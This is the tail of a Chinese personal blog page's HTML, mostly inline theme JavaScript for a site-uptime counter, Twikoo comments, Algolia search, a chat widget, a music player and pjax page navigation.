    now = new Date(); // 更新 now 的值
    nowHour = now.getHours(); // 更新 nowHour 的值
    var days = (now - grt) / 1000 / 60 / 60 / 24;
    dnum = Math.floor(days);
    var hours = (now - grt) / 1000 / 60 / 60 - 24 * dnum;
    hnum = Math.floor(hours);
    if (String(hnum).length == 1) {
      hnum = "0" + hnum;
    }
    var minutes = (now - grt) / 1000 / 60 - 24 * 60 * dnum - 60 * hnum;
    mnum = Math.floor(minutes);
    if (String(mnum).length == 1) {
      mnum = "0" + mnum;
    }
    var seconds = (now - grt) / 1000 - 24 * 60 * 60 * dnum - 60 * 60 * hnum - 60 * mnum;
    snum = Math.round(seconds);
    if (String(snum).length == 1) {
      snum = "0" + snum;
    }
  }

  // 更新网页中显示的网站运行时间
  function updateHtml() {
    const footer = document.getElementById("footer");
    if (!footer) return
    let currentTimeHtml = "";
    if (nowHour < 18 && nowHour >= 9) {
      // 如果是上班时间，默认就是"安知鱼-上班摸鱼中.svg"图片，不需要更改
      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    } else {
      // 如果是下班时间，插入"安知鱼-下班啦.svg"图片
      let img = document.querySelector("#workboard .workSituationImg");
      if (img != null) {
        img.src = "https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064228.png";
        img.title = "下班玩人工智能，嘿嘿~";
        img.alt = "下班玩人工智能，嘿嘿~";
      }

      currentTimeHtml = `本站居然运行了 ${dnum} 天<span id='runtime'> ${hnum} 小时 ${mnum} 分 ${snum} 秒 </span><i class='anzhiyufont anzhiyu-icon-heartbeat' style='color:red'></i>`;
    }

    if (document.getElementById("runtimeTextTip")) {
      document.getElementById("runtimeTextTip").innerHTML = currentTimeHtml;
    }
  }

  setInterval(() => {
    updateTime();
    updateHtml();
  }, 1000);
})();</script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://takake.netlify.app/.netlify/functions/twikoo',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.25/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "vister@takake.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script>(() => {
  const isChatBtn = false
  const isChatHideShow = false

  if (isChatBtn) {
    const close = () => {
      Chatra('minimizeWidget')
      Chatra('hide')
    }

    const open = () => {
      Chatra('openChat', true)
      Chatra('show')
    }

    window.ChatraSetup = {
      startHidden: true
    }
  
    window.chatBtnFn = () => {
      const isShow = document.getElementById('chatra').classList.contains('chatra--expanded')
      isShow ? close() : open()
    }
  } else if (isChatHideShow) {
    window.chatBtn = {
      hide: () => {
        Chatra('hide')
      },
      show: () => {
        Chatra('show')
      }
    }
  }

  (function(d, w, c) {
    w.ChatraID = 'MYtmap9meYHQGdDTJ'
    var s = d.createElement('script')
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments)
    }
    s.async = true
    s.src = 'https://call.chatra.io/chatra.js'
    if (d.head) d.head.appendChild(s)
  })(document, window, 'Chatra')

})()</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>